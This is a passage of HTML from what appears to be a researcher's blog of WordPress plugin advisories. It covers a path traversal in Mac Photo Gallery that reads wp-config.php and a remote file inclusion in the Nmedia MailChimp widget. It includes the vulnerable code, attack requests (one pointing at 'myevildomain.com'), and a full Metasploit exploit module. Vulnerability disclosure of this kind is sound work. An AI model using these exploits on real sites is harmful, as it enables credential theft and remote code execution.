class="crayon-num" data-line="crayon-53c9878f29e39758971765-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f29e39758971765-14">14</div><div class="crayon-num" data-line="crayon-53c9878f29e39758971765-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f29e39758971765-16">16</div><div class="crayon-num" data-line="crayon-53c9878f29e39758971765-17">17</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f29e39758971765-1"><span class="crayon-e">require_once</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-e">dirname</span><span class="crayon-sy">(</span><span class="crayon-i">__FILE__</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">'/macDirectory.php'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f29e39758971765-2">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f29e39758971765-3"><span class="crayon-sy">$</span><span class="crayon-v">folder</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">dirname</span><span class="crayon-sy">(</span><span class="crayon-e">plugin_basename</span><span class="crayon-sy">(</span><span class="crayon-i">__FILE__</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f29e39758971765-4"><span class="crayon-sy">$</span><span class="crayon-v">file</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">dirname</span><span class="crayon-sy">(</span><span class="crayon-e">dirname</span><span class="crayon-sy">(</span><span class="crayon-e">dirname</span><span class="crayon-sy">(</span><span class="crayon-i">__FILE__</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">"/uploads/mac-dock-gallery/"</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'albid'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f29e39758971765-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f29e39758971765-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Content-Description: File Transfer'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f29e39758971765-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Content-Type: application/octet-stream'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f29e39758971765-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Content-Disposition: attachment; filename='</span><span class="crayon-sy">.</span><span class="crayon-e">basename</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">file</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f29e39758971765-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Content-Transfer-Encoding: binary'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f29e39758971765-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Expires: 0'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f29e39758971765-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Cache-Control: must-revalidate, post-check=0, pre-check=0'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f29e39758971765-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Pragma: public'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f29e39758971765-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Content-Length: '</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-e">filesize</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">file</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f29e39758971765-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">ob_clean</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f29e39758971765-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">flush</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f29e39758971765-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">readfile</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f29e39758971765-17"><span class="crayon-sy">?</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0048 seconds] -->
<p>If we make a request like this, it will cause the code to read out the wp-config.php file, which will contain database credentials in.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f29e45820676215" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /wp-content/plugins/mac-dock-gallery/macdownload.php?albid=../../../wp-config.php HTTP/1.1
Host: 192.168.80.130</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f29e45820676215-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f29e45820676215-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f29e45820676215-1"><span class="crayon-i">GET</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">mac</span><span class="crayon-o">-</span><span class="crayon-i">dock</span><span class="crayon-o">-</span><span class="crayon-i">gallery</span><span class="crayon-o">/</span><span class="crayon-v">macdownload</span><span class="crayon-sy">.</span><span class="crayon-i">php</span><span class="crayon-sy">?</span><span class="crayon-v">albid</span><span class="crayon-o">=</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-v">config</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f29e45820676215-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0018 seconds] -->
<p></p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/mac-photo-gallery/" rel="tag">Mac Photo Gallery</a>, <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2012/06/21/wordpress-mac-photo-gallery-plugin-albid-arbitrary-file-disclosure-vulnerability/#respond" title="Comment on WordPress Mac Photo Gallery plugin &#8220;albid&#8221; arbitrary file disclosure vulnerability">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-18 -->

				
					
<article id="post-11" class="post-11 post type-post status-publish format-standard hentry category-advisories tag-nmedia-mailchimp-widget tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2012/06/21/wordpress-nmedia-mailchimp-widget-abs_path-remote-file-inclusion-vulnerability/" title="6:48 pm" rel="bookmark" class="entry-date"><time datetime="2012-06-21T18:48:54+00:00" pubdate>June 21, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2012/06/21/wordpress-nmedia-mailchimp-widget-abs_path-remote-file-inclusion-vulnerability/" title="Permalink to WordPress Nmedia MailChimp widget &#8220;abs_path&#8221; remote file inclusion vulnerability" rel="bookmark">WordPress Nmedia MailChimp widget &#8220;abs_path&#8221; remote file inclusion vulnerability</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong><br />
<a href="http://secunia.com/advisories/49538/">Secunia Advisory SA 49538</a></p>
<p><strong>Analysis</strong><br />
This vulnerability is nothing but a textbook arbitrary file inclusion vulnerability. The file is used to interacting with the mailchimp API. But the very first 2 lines of executable code in <a href="http://plugins.svn.wordpress.org/nmedia-mailchimp-widget/tags/3.1/api_mailchimp/postToMailChimp.php">/api_mailchimp/postToMailChimp.php</a>, it goes ahead and accepts a path for loading a file.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f2a336741355918" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$path = $_POST['abs_path'] . 'wp-load.php';
//echo $path; die;
require( $path );</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f2a336741355918-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a336741355918-2">2</div><div class="crayon-num" data-line="crayon-53c9878f2a336741355918-3">3</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f2a336741355918-1"><span class="crayon-sy">$</span><span class="crayon-v">path</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'abs_path'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">'wp-load.php'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a336741355918-2"><span class="crayon-c">//echo $path; die;</span></div><div class="crayon-line" id="crayon-53c9878f2a336741355918-3"><span class="crayon-e">require</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">path</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0012 seconds] -->
<p>By making following request, where the url has a file called &#8216;wp-load.php&#8217; or otherwise will return php code, or using the proof of concept code, we can exploit this</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f2a341370181837" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/nmedia-mailchimp-widget/api_mailchimp/postToMailChimp.php
HTTP/1.1
Host: 192.168.80.130
Content-Type: application/x-www-form-urlencoded
Content-Length: 21

abs_path=http://myevildomain.com/</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f2a341370181837-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a341370181837-2">2</div><div class="crayon-num" data-line="crayon-53c9878f2a341370181837-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a341370181837-4">4</div><div class="crayon-num" data-line="crayon-53c9878f2a341370181837-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a341370181837-6">6</div><div class="crayon-num" data-line="crayon-53c9878f2a341370181837-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f2a341370181837-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">nmedia</span><span class="crayon-o">-</span><span class="crayon-i">mailchimp</span><span class="crayon-o">-</span><span class="crayon-i">widget</span><span class="crayon-o">/</span><span class="crayon-i">api_mailchimp</span><span class="crayon-o">/</span><span class="crayon-v">postToMailChimp</span><span class="crayon-sy">.</span><span class="crayon-e">php</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a341370181837-2"><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line" id="crayon-53c9878f2a341370181837-3"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a341370181837-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line" id="crayon-53c9878f2a341370181837-5"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">21</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a341370181837-6">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f2a341370181837-7"><span class="crayon-v">abs_path</span><span class="crayon-o">=</span><span class="crayon-i">http</span><span class="crayon-o">:</span><span class="crayon-c">//myevildomain.com/</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0023 seconds] -->
<p><strong>Proof of concept code</strong></p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f2a348645978756" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
require 'msf/core'

class Metasploit3 &lt; Msf::Exploit::Remote
    Rank = ExcellentRanking

    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::Remote::HttpServer::PHPInclude

    def initialize(info = {})
        super(update_info(info,
            'Name'           =&gt; 'WordPress Nmedia MailChimp Widget "abs_path" Remote File Inclusion Vulnerability',
            'Description'    =&gt; %q{
                    This module exploits a remote file include execution vulnerability in the
                WordPress Nmedia MailChimp Widget '/api_mailchimp/postToMailChimp.php' script. 
                All versions of Nmedia MailChimp Widget up to and including 3.1 are vulnerable.
            },
            'Author'         =&gt; [ 'Charlie Eriksen' ],
            'License'        =&gt; MSF_LICENSE,
            'Version'        =&gt; '$Revision$',
            'References'     =&gt;
                [
                    [ 'URL', 'http://secunia.com/advisories/49538/' ],
                ],
            'Privileged'     =&gt; false,
            'Payload'        =&gt;
                {
                    'DisableNops' =&gt; true,
                    'Compat'      =&gt;
                        {
                            'ConnectionType' =&gt; 'find',
                        },
                    # Arbitrary big number. The payload gets sent as an HTTP
                    # response body, so really it's unlimited
                    'Space'       =&gt; 262144, # 256k
                },
            'Platform'       =&gt; 'php',
            'Arch'           =&gt; ARCH_PHP,
            'Targets'        =&gt; [[ 'Automatic', { }]],
            'DisclosureDate' =&gt; 'Jun 21 2012',
            'DefaultTarget' =&gt; 0))

        register_options(
            [
                OptString.new('PHPURI', [ true , "The URI to request", '/wp-content/plugins/nmedia-mailchimp-widget/api_mailchimp/postToMailChimp.php']),
            ], self.class)
    end

    def php_exploit
        postdata = 'abs_path=' &lt;&lt; php_include_url

        print_status("Sending exploit request...")
        response = send_request_raw({
            'global'  =&gt; true,
            'method'  =&gt; 'POST',
            'uri'     =&gt; datastore['PHPURI'],
            'data'    =&gt; postdata,
            'headers' =&gt;
            {
                'Content-Type' =&gt; 'application/x-www-form-urlencoded',
                'Content-Length' =&gt; postdata.length,
            }
        })

        if response and response.code != 200
            print_error("Got a non-200 response back. The server may not be vulnerable (#{response.code})")
        end

        handler
    end

end</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-2">2</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-4">4</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-6">6</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-8">8</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-10">10</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-12">12</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-14">14</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-16">16</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-18">18</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-20">20</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-22">22</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-24">24</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-26">26</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-28">28</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-30">30</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-32">32</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-34">34</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-36">36</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-38">38</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-40">40</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-42">42</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-44">44</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-46">46</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-48">48</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-50">50</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-51">51</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-52">52</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-53">53</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-54">54</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-55">55</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-56">56</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-57">57</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-58">58</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-59">59</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-60">60</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-61">61</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-62">62</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-63">63</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-64">64</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-65">65</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-66">66</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-67">67</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-68">68</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-69">69</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-70">70</div><div class="crayon-num" data-line="crayon-53c9878f2a348645978756-71">71</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2a348645978756-72">72</div></div>
				</td>
